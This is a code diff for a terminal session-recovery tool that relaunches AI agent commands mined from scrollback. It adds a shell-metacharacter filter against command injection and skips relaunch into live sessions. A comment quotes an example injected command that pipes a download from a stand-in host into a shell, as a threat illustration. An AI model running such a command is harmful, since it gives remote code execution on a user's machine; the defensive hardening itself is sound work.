@@ -78,6 +78,13 @@ function matchLaunchLine(line: string, binaries: readonly string[]): string | nu
     const m = line.match(re);
     if (m) {
       const candidate = m[1].trim();
+      // SECURITY: the mined line comes from untrusted scrollback (a malicious
+      // file/process could print `claude --x; curl evil | sh`). Since the
+      // resolved command is typed into the shell on recovery, reject any
+      // candidate carrying shell metacharacters so a poisoned line can't turn
+      // into RCE. The operator-set boot_command path is trusted and bypasses
+      // this. A rejected candidate falls through to the default/null path.
+      if (/[;&|`$(){}<>\\]/.test(candidate)) continue;
       // Accept the bare binary or anything with args/flags; reject a token that
       // merely ends in the binary name (the capture guarantees it heads it).
       if (candidate === bin || /\s/.test(candidate)) return candidate;
@@ -191,7 +198,12 @@ export async function recoverSession(
     return { sessionId, name: record.name, command, action: 'planned', agentLaunched: false };
   }
 
-  const alreadyAlive = (await listTerminals()).includes(sessionId);
+  // A still-alive session is a no-op: recreating the pane is redundant and —
+  // critically — typing the launch command into a LIVE agent's pane would
+  // disrupt whatever it's doing. Reattach without side effects.
+  if ((await listTerminals()).includes(sessionId)) {
+    return { sessionId, name: record.name, command, action: 'reattached', agentLaunched: false };
+  }
   const lastPath = getTerminalById(sessionId)?.last_path ?? undefined;
 
   let spawn;
@@ -232,10 +244,7 @@ export async function recoverSession(
     agentLaunched = true;
   }
 
-  return {
-    sessionId, name: record.name, command,
-    action: alreadyAlive ? 'reattached' : 'spawned', agentLaunched
-  };
+  return { sessionId, name: record.name, command, action: 'spawned', agentLaunched };
 }
 
 /**
